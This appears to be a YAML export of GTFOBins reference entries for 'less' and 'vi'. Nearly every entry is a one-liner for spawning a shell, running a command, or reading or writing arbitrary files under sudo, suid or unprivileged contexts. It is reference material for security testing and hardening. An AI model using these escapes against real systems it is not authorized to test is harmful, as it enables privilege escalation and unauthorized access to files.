  GTFOBins:
    raw:
      documents:
        less:
          functions:
            command:
            - code: 'cp /path/to/command ~/.lessfilter

                less /etc/hosts'
              contexts:
                unprivileged: null
            - code: 'LESSOPEN=''/path/to/command # %s'' less /etc/hosts'
              contexts:
                sudo: null
                unprivileged: null
            file-read:
            - code: less /path/to/input-file
              contexts:
                sudo: null
                suid: null
                unprivileged: null
            - code: 'less /etc/hosts

                :e /path/to/input-file'
              comment: This can be used to read another file, e.g., when invoked as a pager with some
                fixed content.
              contexts:
                sudo: null
                suid: null
                unprivileged: null
            - code: 'LESSOPEN=''echo /path/to/input-file # %s'' less /etc/hosts'
              comment: This can be used to read another file.
              contexts:
                sudo: null
                unprivileged: null
            file-write:
            - code: 'echo DATA | less

                s/path/to/output-file

                q'
              contexts:
                sudo: null
                suid: null
                unprivileged: null
            inherit:
            - code: 'less /etc/hosts

                v'
              contexts:
                sudo: null
                suid: null
                unprivileged: null
              from: vi
            shell:
            - code: 'less /etc/hosts

                !/bin/sh'
              contexts:
                sudo: null
                suid:
                  shell: true
                unprivileged: null
            - code: 'LESSOPEN="/bin/sh -s 1>&0 2>&0 # %s" less /etc/hosts

                reset'
              comment: The optional `reset` command is needed to receive the echo back of the typed keystrokes.
              contexts:
                sudo: null
                unprivileged: null
            - code: 'VISUAL=''/bin/sh -s --'' less /etc/hosts

                v'
              contexts:
                sudo: null
                unprivileged: null
        vi:
          functions:
            file-read:
            - code: vi /path/to/input-file
              contexts:
                sudo: null
                suid: null
                unprivileged: null
            file-write:
            - code: 'vi /path/to/output-file

                iDATA

                ^[

                w'
              comment: Where `^[` is the escape key.
              contexts:
                sudo: null
                suid: null
                unprivileged: null
            shell:
            - code: vi -c ':!/bin/sh' /dev/null
              contexts:
                sudo: null
                suid:
                  shell: true
                unprivileged: null
            - code: vi -c ':shell'
              contexts:
                sudo: null
                suid:
                  shell: true
                unprivileged: null
            - code: vi -c ':set shell=/bin/sh | shell'
              contexts:
                sudo: null
                suid:
                  code: vi -c ':set shell=/bin/sh\ -p | shell'
                  shell: false
                unprivileged: null
            - code: vi -c :terminal /bin/sh
              contexts:
                sudo: null
                suid:
                  code: vi -c ':terminal /bin/sh -p'
                  shell: false
                unprivileged: null
